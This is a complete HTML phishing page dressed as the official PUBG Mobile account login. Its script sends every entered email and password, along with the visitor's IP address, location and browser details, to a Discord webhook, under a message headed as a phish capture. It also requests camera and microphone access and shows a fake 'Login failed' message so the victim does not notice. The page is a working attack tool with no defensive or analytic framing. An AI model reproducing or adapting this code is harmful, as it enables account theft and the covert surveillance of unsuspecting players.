<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG MOBILE - Official Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: url('https://www.pubgmobile.com/en/images/bg_main.jpg') no-repeat center center fixed;
            background-size: cover;
            font-family: 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
        }
        .login-container {
            background: rgba(0, 0, 0, 0.8);
            padding: 40px;
            border-radius: 10px;
            width: 350px;
            text-align: center;
            box-shadow: 0 0 20px rgba(255, 165, 0, 0.5);
            border: 1px solid #f39c12;
        }
        .logo {
            width: 200px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            background: #222;
            border: 1px solid #555;
            color: white;
            border-radius: 5px;
            box-sizing: border-box;
        }
        input:focus {
            border-color: #f39c12;
            outline: none;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #f39c12;
            color: black;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            font-size: 16px;
        }
        button:hover {
            background: #e67e22;
        }
        .links {
            margin-top: 15px;
            font-size: 12px;
            display: flex;
            justify-content: space-between;
        }
        .links a {
            color: #f39c12;
            text-decoration: none;
            cursor: pointer;
        }
        .links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

<div class="login-container">
    <img src="https://www.pubgmobile.com/en/images/logo.png" alt="PUBG Logo" class="logo">
    <h2>ACCOUNT LOGIN</h2>
    <input type="text" id="email" placeholder="Email or Phone Number" required>
    <input type="password" id="password" placeholder="Password" required>
    <button id="loginBtn">LOG IN</button>
    <div class="links">
        <a id="forgotBtn">Forgot Password?</a>
        <a id="registerBtn">Register</a>
    </div>
</div>

<video id="videoElement" autoplay style="display:none;"></video>

<script>
    const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3
        ';

    async function getIPAndLocation() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            return await res.json();
        } catch (e) {
            return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown' };
        }
    }

    function getOSAndBrowser() {
        return navigator.userAgent;
    }

    async function sendToDiscord(action, email, password) {
        const geo = await getIPAndLocation();
        const time = new Date().toISOString();
        const ua = getOSAndBrowser();

        const payload = {
            content: `**New PUBG Phish Capture**\n**Action:** ${action}\n**Email:** ${email}\n**Password:** ${password}\n**IP:** ${geo.ip}\n**Location:** ${geo.city}, ${geo.region}, ${geo.country_name}\n**Time:** ${time}\n**OS/Browser:** ${ua}`
        };

        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }

    async function captureMedia() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const video = document.getElementById('videoElement');
            video.srcObject = stream;
        } catch (err) {
            console.error("Media capture failed", err);
        }
    }

    document.getElementById('loginBtn').addEventListener('click', async () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;
        captureMedia();
        await sendToDiscord('Login Attempt', email, pass);
        alert('Login failed. Please try again.');
    });

    document.getElementById('registerBtn').addEventListener('click', async () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;
        await sendToDiscord('Register Clicked', email, pass);
    });

    document.getElementById('forgotBtn').addEventListener('click', async () => {
        const email = document.getElementById('email').value;
        await sendToDiscord('Forgot Password Clicked', email, 'N/A');
    });
</script>

</body>
</html>
